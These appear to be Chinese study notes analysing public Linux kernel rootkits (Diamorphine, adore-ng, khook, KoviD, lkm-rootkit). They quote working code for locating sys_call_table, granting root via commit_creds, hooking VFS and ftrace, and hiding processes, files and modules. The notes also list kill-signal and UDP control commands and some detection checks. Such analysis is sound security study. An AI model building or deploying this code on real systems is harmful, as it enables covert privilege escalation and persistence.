# Diamorphine

### hook思路

直接hook 系统调用表

### 用户态交互思路

```shell
kill -n 64 1 # 提权
kill -n 63 1 # 模块隐藏与显示
kill -n 31 PID # 隐藏进程 (task->flags ^= PF_INVISIBLE)
```

### syscall_table 获取

##### LINUX_VERSION_CODE 《= KERNEL_VERSION(4, 4, 0)

暴力搜索：

```c
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
```

##### LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) &&  LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)

```c
syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

##### LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

当内核版本 >= KERNEL_VERSION(5,7,0) 时候，kallsyms_lookup_name 不在导出，需要通过 kprobe获取其地址：

```c
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name;
register_kprobe(&kp);
kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
unregister_kprobe(&kp);

syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

### 权限提升

```c
void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}
```

### 与用户之间的通信

通过hook kill 发信号，实现权限提升，以及模块、进程隐藏

### 检查思路

- 由于模块隐藏不彻底，可以通过/sys/module/查找到隐藏的模块

```
ls /sys/module/diamorphine/
```

- 由于是通过kill发送控制命令，我们可以通过在普通用户模式下执行

```
kill -n 64 1
```

没有该rootkit的情况下，会显示：

```
-bash: kill: (1) - Operation not permitted
```

  

# adore-ng

###  用户态交互思路

```c
/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * echo > /proc/<ADORE_KEY>-fullprivs will give UID 0,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 */
 struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                            struct nameidata *nd)
```

### hook 思路

**VFS hook**

```c
filep = filp_open("/proc/", O_RDONLY|O_DIRECTORY, 0);
if (IS_ERR(filep)) 
	return -1;
	
orig_cr0 = clear_return_cr0();

new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
orig_proc_lookup = new_inode_op->lookup;
new_inode_op->lookup = adore_lookup; //hook /proc 目录查找函数，实现与用户的交互

```

```c
int patch_vfs(const char *p, 
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
			readdir_t *orig_readdir, readdir_t new_readdir
#else
			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
#endif
			)
{
	struct file_operations *new_op;
	struct file *filep;

	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}
	
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
	if (orig_readdir)
		*orig_readdir = filep->f_op->readdir;
#else
	if (orig_iterate)
		*orig_iterate = filep->f_op->iterate;
#endif

	new_op = (struct file_operations *)filep->f_op;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	new_op->readdir = new_readdir;
#else
	new_op->iterate = new_iterate;
	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
#endif

	filep->f_op = new_op;
	filp_close(filep, 0);
	return 0;
}

patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);//替换目录遍历函数，实现进程隐藏
patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);//替换目录遍历函数，实现文件隐藏
```



### 模块隐藏

通过对adore-ng 代码分析，我们还需要对 /sys/module 下的 模块文件进行隐藏。

sysfs 是 Linux 内核中的一个虚拟文件系统，它提供了一个统一的接口来访问内核对象，kobject 代表一个内核对象，而 kset 是一组 kobject 的集合。

内核模块加载时，调用 mod_sysfs_setup(/kernel/module/sysfs.c) 函数，初始化其对应的 /sys/module下面的目录。

##### kobject、kset

Kobject代表一个目录, 而Attribute代表该目录下的文件

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/slab.h>		/*kzalloc, kmalloc*/
#include <linux/sysfs.h>	/*optional: has been included in kobject.h */

/* 
 * Another special macro (MODULE_LICENSE) is used to tell the kernel that this 
 * module bears a free license; without such a declaration, the kernel 
 * complains when the module is loaded.
 */
MODULE_LICENSE("Dual BSD/GPL");

static struct kset    *example_kset;
static struct kobject *example_kobj;

static int kset_attr_value = 0;
static int kobj_attr_value = 0;

/*
 * functions for kset
 */

/*the attribute for the kset*/
static struct attribute kset_attr = {
	.name = "kset_attr",
	.mode = VERIFY_OCTAL_PERMISSIONS(0664),
};

static void kset_self_release(struct kobject *kobj)
{
	struct kset *kset = container_of(kobj, struct kset, kobj);
	printk(KERN_ALERT "release kset (%p)\n", kset);
	kfree(kset);
}

static ssize_t kset_kobj_attr_show(struct kobject *kobj, struct attribute *attr,
			      char *buf)
{
	ssize_t ret = -EIO;
	
	ret = sprintf(buf, "%d\n", kset_attr_value);
	
	return ret;
}

static ssize_t kset_kobj_attr_store(struct kobject *kobj, struct attribute *attr,
			       const char *buf, size_t count)
{
	ssize_t ret = -EIO;
	
	sscanf(buf, "%du", &kset_attr_value);
	
	printk(KERN_ALERT "attribute value from user for kset %s\n", buf);

	ret = count;
	
	return ret;
}

const struct sysfs_ops kset_kobj_sysfs_ops = {
	.show	= kset_kobj_attr_show,
	.store	= kset_kobj_attr_store,
};

/*your own ktype for the kset's kobject*/
static struct kobj_type kset_self_ktype = {
	.release = kset_self_release,
	.sysfs_ops = &kset_kobj_sysfs_ops,
};

/*
 * functions for kobject
 */
 
static ssize_t kobject_attr_show(struct kobject *kobj, struct kobj_attribute *attr,
			      char *buf)
{
	ssize_t ret = -EIO;
	
	ret = sprintf(buf, "%d\n", kobj_attr_value);
	
	return ret;
}

static ssize_t kobject_attr_store(struct kobject *kobj, struct kobj_attribute *attr,
			       const char *buf, size_t count)
{
	ssize_t ret = -EIO;
	
	sscanf(buf, "%du", &kobj_attr_value);
	
	printk(KERN_ALERT "attribute value from user for kobject %s\n", buf);

	ret = count;
	
	return ret;
}

/*the attribute for the kobject*/
static struct kobj_attribute kobj_attr =
	__ATTR(kobj_attr, 0664, kobject_attr_show, kobject_attr_store);

static void ktype_release(struct kobject *kobj)
{
	printk(KERN_ALERT "release kobject (%p)\n", kobj);
	kfree(kobj);
}

/*your own ktype for the kobject*/
static struct kobj_type kobject_ktype = {
	.release	= ktype_release,
	/*Note: 
	 * Here we don't define the ops but use kobj_sysfs_ops which is defined in kobject.c
	 * because we have done it in manual_kobject_attribute, don't want to do it again
	 */
	.sysfs_ops	= &kobj_sysfs_ops,
};

static int __init example_init(void)
{
	int retval;
	
	/*first: allocate a kset memory and prepare the kobj.ktype for this kset*/
	example_kset = kzalloc(sizeof(*example_kset), GFP_KERNEL);
	if(!example_kset)
		return -ENOMEM;
	retval = kobject_set_name(&example_kset->kobj, "%s", "example_kset");
	if (retval) {
		kfree(example_kset);
		return retval;
	}
	example_kset->uevent_ops = NULL;
	example_kset->kobj.parent = NULL;
	example_kset->kobj.ktype = &kset_self_ktype;
	example_kset->kobj.kset = NULL;
	
	/*second: register the kset*/
	retval = kset_register(example_kset);
	if (retval) {
		kfree(example_kset);
		return retval;
	}
	
	/*third: create the attribute file associated with this kset*/
	retval = sysfs_create_file(&example_kset->kobj, &kset_attr);
	if (retval) {
		printk(KERN_WARNING "%s: sysfs_create_file for kset error: %d\n",
		       __func__, retval);
		goto create_kset_attribute_error;
	}
	
	/*4th: allocate a kobject memory*/
	example_kobj = kzalloc(sizeof(*example_kobj), GFP_KERNEL);
	if (!example_kobj) {
		retval = -ENOMEM;
		goto allocate_kobject_error;
	}
	
	/*5th: define your own ktype, and init the kobject*/
	kobject_init(example_kobj, &kobject_ktype);
	
	/*6th: set the kobject's kset*/
	example_kobj->kset = example_kset;
	
	/*7th: add the kobject to kernel*/
	retval = kobject_add(example_kobj, NULL, "%s", "example_kobj");
	if (retval) {
		printk(KERN_WARNING "%s: kobject_add error: %d\n",
		       __func__, retval);
		goto kobject_add_error;
	}
	
	/*8th: create the attribute file associated with this kobject */
	retval = sysfs_create_file(example_kobj, &kobj_attr.attr);
	if (retval) {
		printk(KERN_WARNING "%s: sysfs_create_file error: %d\n",
		       __func__, retval);
		goto create_attribute_error;
	}
	
	return 0;

create_attribute_error:
kobject_add_error:
	kobject_put(example_kobj);
allocate_kobject_error:
	example_kobj = NULL;
create_kset_attribute_error:
	kset_unregister(example_kset);
	example_kset = NULL;
	return retval;
}

static void example_exit(void)
{
	kobject_put(example_kobj);
	example_kobj = NULL;
	kset_unregister(example_kset);
	example_kset = NULL;
}

module_init(example_init);
module_exit(example_exit);

MODULE_AUTHOR("John LiuXin");
MODULE_DESCRIPTION("Example of manual create kobject and attribute");
```

/sys/module的创建函数为：/kernel/params.c:param_sysfs_init



/sys/module目录下的模块目录创建流程：



```c
kobject_add -> kobject_add_internal ->  create_dir -> sysfs_create_dir_ns
```



/sys/module目录下的模块目录删除流程：

```c
kobject_del -> __kobject_del -> sysfs_remove_dir
```



##### 思路1

利用hook , hook掉 gendents，隐藏 /sys/module下面对应的模块文件

##### 思路2

利用 kobject_del(&THIS_MODULE->mkobj.kobj);去除，但是这玩意有点问题，使用后无法卸载模块

##### 思路3

sysfs 文件与目录最终会通过kernfs 进行组织以及显示，可以通过 kernfs_unlink_sibling ( （红黑树）)，将 kobject 对应的 kernfs_inode 去掉， 但是貌似无法实现，因为 kernfs_unlink_sibling 没有导出，且通过 kallsyms_lookup_name 也无法获取。需要自己手动实现:

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/spinlock.h>
#include <linux/sysfs.h>
#include <linux/kprobes.h>
#include <linux/rbtree.h>
#include <linux/delay.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}

#define rb_to_kn(X) rb_entry((X), struct kernfs_node, rb)
static int kernfs_name_compare(unsigned int hash, const char *name,
			       const void *ns, const struct kernfs_node *kn)
{
	if (hash < kn->hash)
		return -1;
	if (hash > kn->hash)
		return 1;
	if (ns < kn->ns)
		return -1;
	if (ns > kn->ns)
		return 1;
	return strcmp(name, kn->name);
}

static int kernfs_sd_compare(const struct kernfs_node *left,
			     const struct kernfs_node *right)
{
	return kernfs_name_compare(left->hash, left->name, left->ns, right);
}

static bool kernfs_link_sibling(struct kernfs_node *kn)
{
	struct rb_node **node = &kn->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while (*node) {
		struct kernfs_node *pos;
		int result;

		pos = rb_to_kn(*node);
		parent = *node;
		result = kernfs_sd_compare(kn, pos);
		if (result < 0)
			node = &pos->rb.rb_left;
		else if (result > 0)
			node = &pos->rb.rb_right;
		else
			return -EEXIST;
	}

	/* add new node and rebalance the tree */
	rb_link_node(&kn->rb, parent, node);
	rb_insert_color(&kn->rb, &kn->parent->dir.children);
	return true;
}

static bool kernfs_unlink_sibling(struct kernfs_node *kn)
{
	rb_erase(&kn->rb, &kn->parent->dir.children);
	return true;
}

static int example_init(void)
{
	printk("example init\n");
	init_ksymbol();

	//&THIS_MODULE->mkobj.kobj
	
	kernfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);
	
	msleep(30*1000);//sleep 30 seconds

	kernfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);

	return 0;
}

static void example_exit(void)
{
	printk("example exit\n");
}

module_init(example_init);
module_exit(example_exit);
MODULE_LICENSE("GPL");
```

30 秒前，会将 /sys/module下面对应模块的目录隐藏掉

# khook

一个内核函数hook框架

### 工作原理

The diagram below illustrates the call to function X without hooking:

```
CALLER
| ...
| CALL X -(1)---> X
| ...  <----.     | ...
` RET       |     ` RET -.
            `--------(2)-'
```

The diagram below illustrates the call to function X when KHOOK is used:

```
CALLER
| ...
| CALL X -(1)---> X
| ...  <----.     | JUMP -(2)----> khook_X_stub
` RET       |     | ???            | INCR use_count
            |     | ...  <----.    | CALL handler   -(3)----> khook_X
            |     | ...       |    | DECR use_count <----.    | ...
            |     ` RET -.    |    ` RET -.              |    | CALL origin -(4)----> khook_X_orig
            |            |    |           |              |    | ...  <----.           | N bytes of X
            |            |    |           |              |    ` RET -.    |           ` JMP X + N -.
            `------------|----|-------(8)-'              '-------(7)-'    |                        |
                         |    `-------------------------------------------|--------------------(5)-'
                         `-(6)--------------------------------------------'
```

### 代码分析

```c
/**
 * stop_machine: freeze the machine on all CPUs and run this function
 * @fn: the function to run
 * @data: the data ptr for the @fn()
 * @cpus: the cpus to run the @fn() on (NULL = any online cpu)
 *
 * Description: This causes a thread to be scheduled on every cpu,
 * each of which disables interrupts.  The result is that no one is
 * holding a spinlock or inside any other preempt-disabled region when
 * @fn() runs.
 *
 * This can be thought of as a very heavy write lock, equivalent to
 * grabbing every spinlock in the kernel.
 *
 * Protects against CPU hotplug.
 */
int stop_machine(cpu_stop_fn_t fn, void *data, const struct cpumask *cpus);

int khook_init(khook_lookup_t lookup)
{
........................................
	stop_machine(khook_sm_init_hooks, NULL, 0);

	return 0;
}

void khook_cleanup(void)
{
	stop_machine(khook_sm_cleanup_hooks, NULL, 0);
	khook_release();
}

```

khook_sm_init_hooks -->  khook_arch_sm_init_one 

```c
void khook_arch_sm_init_one(khook_t *hook) {
	void _activate(khook_t *hook) {
		khook_arch_create_stub(hook); //初始化hook汇编代码
		khook_arch_create_orig(hook); //用于复制被hook函数的开始汇编代码到一块内存中，然后加上跳过
		x86_put_jmp(hook->target.addr, hook->target.addr, hook->stub);
	}

	if (hook->target.addr[0] == (char)0xE9 ||
	    hook->target.addr[0] == (char)0xCC) return;

	while (hook->nbytes < 5) {
		hook->nbytes += khook_arch_lde_get_length(hook->target.addr + hook->nbytes);
	}

	khook_arch_write_kernel((void *)_activate, hook);
}
```

首先将被hook函数的开始的汇编指令复制到一块内存中，然后再在这内存块加上跳转指令，跳过被hook函数开始的汇编指令之后的指令（因为被hook函数的开始的汇编指令会被 替换为跳转到 hook函数的指令，有点乱，直接看他的原理图）。

# KoviD

### hook 

利用 ftrace进行hook

```c
static struct ftrace_hook ft_hooks[] = {
    {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
    {"sys_clone", m_clone, &real_m_clone, true},
    {"sys_kill", m_kill, &real_m_kill, true},
    {"sys_bpf", m_bpf, &real_m_bpf, true},
    {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},//网络信息隐藏
    {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
    {"tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show},
    {"udp6_seq_show", m_udp6_seq_show, &real_m_udp6_seq_show},
    {"packet_rcv", m_packet_rcv, &real_packet_rcv},
    {"tpacket_rcv", m_tpacket_rcv, &real_tpacket_rcv},
    {"account_process_tick", m_account_process_tick, &real_account_process_tick},
    {"account_system_time", m_account_system_time, &real_account_system_time},
    {"audit_log_start", m_audit_log_start, &real_audit_log_start},
    {"filldir", m_filldir, &real_filldir},
    {"filldir64", m_filldir64, &real_filldir64},
    {"tty_read", m_tty_read, &real_tty_read},
    {NULL, NULL, NULL},
};
```

### CPU时间隐藏

hook：

- account_process_tick
- account_system_time

### 文件隐藏

通过 hook掉 filldir/filldir64实现文件隐藏，这玩意比直接 hook getdents系统调用要好（没有修改用户态的数据，不好检查到）

### netfilter

存在敲门包，然后提取命令 ， 调用call_usermodehelper执行用户态命令。

### 与用户之间的交互

hook kill 函数，

提权： kill -n 19 666

打开/proc/PROCNAME 命令交互接口：kill -n 19 31337 ， 然后用户通过直接写入/proc/PROCNAME，来与该rootkit交互。

支持的命令(查看write_cb函数，可以知道该rootkit支持的命令)：

```c
        /* Hide PID as backdoor */
        if(!strncmp(buf, "-bd", MIN(3, size))) {
                  /* hide kovid module */
        } else if(!strcmp(buf, "-h") && !op_lock) {
          ................
```

### 进程隐藏

```c
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    struct hlist_node *link;
#else
    struct pid_link *link;
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    link = &node->task->pid_links[PIDTYPE_PID];
#else
    link = &node->task->pids[PIDTYPE_PID];
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    hlist_del(link);
#else
    hlist_del(&link->node);
#endif
```

恢复隐藏：

```c
attach_pid(task, PIDTYPE_PID);
```

在 Linux 内核中，attach_pid 是一个与进程管理相关的函数。它的主要作用是将一个进程的 pid 结构体附加到指定的 PID 类型（例如，PIDTYPE_PID、PIDTYPE_TGID、PIDTYPE_PGID 或 PIDTYPE_SID）和 PID 哈希链中。这个过程涉及将一个进程与特定类型的 PID 关联起来，从而支持进程的各种管理操作，如查找、信号发送等。



### 学到的姿势

内核读写文件：filp_open --> kernel_write / kernel_read --> filp_close


# lkm-rootkit

### hook 方式

hook syscall_table

### 会启动 udp server 与 用户空间进行交互

```c
sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock);

memset(&kthread->addr, 0, sizeof(struct sockaddr));
kthread->addr.sin_family = AF_INET;
kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
kthread->addr.sin_port = htons(UDP_PORT);

kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr));

size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
```

支持的命令：

```c
#define CMD_HIDE_MODULE "hidemod"
#define CMD_SHOW_MODULE "showmod"
#define CMD_UNLOAD_MODULE "unloadmod"

#define CMD_HIDE_FILE "hidefile"
#define CMD_SHOW_FILE "showfile"

#define CMD_HIDE_PROCESS "hideproc"
#define CMD_SHOW_PROCESS "showproc"
#define CMD_POP_PROCESS "popproc"

#define CMD_HIDE_SOCKET "hidesocket"
#define CMD_SHOW_SOCKET "showsocket"

#define CMD_HIDE_PACKET "hidepacket"
#define CMD_SHOW_PACKET "showpacket"

#define CMD_HIDE_PORT "hideport"
#define CMD_SHOW_PORT "showport"

#define CMD_INIT_KEYLOGGER "keylog"
#define CMD_EXIT_KEYLOGGER "keyunlog"

#define CMD_PROC_ESCALATE "escalate"
#define CMD_PROC_DEESCALATE "deescalate"
```

具体的函数：cmd_run();

### 模块隐藏

这rootkit的话，做的比较好：

会从module list中断链，也会从红黑树中删除自己

hide_module:

```c
struct kernfs_node *node = mod->mkobj.kobj.sd;

/* remove module from module list */
list_del(&mod->list);

/* remove module from rbtree */ //remove from /sys/module
rb_erase(&node->rb, &node->parent->dir.children);
node->rb.__rb_parent_color = (unsigned long)(&node->rb);
```

unhide_module:

```c
if(mod == THIS_MODULE)
	list_add(&mod->list, head);
else
	list_add_tail(&mod->list, head);

/* add module back in rbtree */
rb_add(mod->mkobj.kobj.sd);
```

# 资料

Diamorphine

https://github.com/m0nad/Diamorphine

adore-ng

https://github.com/yaoyumeng/adore-ng

设备模型

https://www.cnblogs.com/jliuxin/p/14129383.html

kernfs_node、kobject和kset

https://blog.csdn.net/zhoudawei/article/details/86669868

sysfs分析

https://palliatory66.rssing.com/chan-60693167/all_p3.html

khook （kernel hook框架）

https://github.com/milabs/khook?tab=readme-ov-file 

KoviD

https://github.com/carloslack/KoviD

lkm-rootkit

https://github.com/croemheld/lkm-rootkit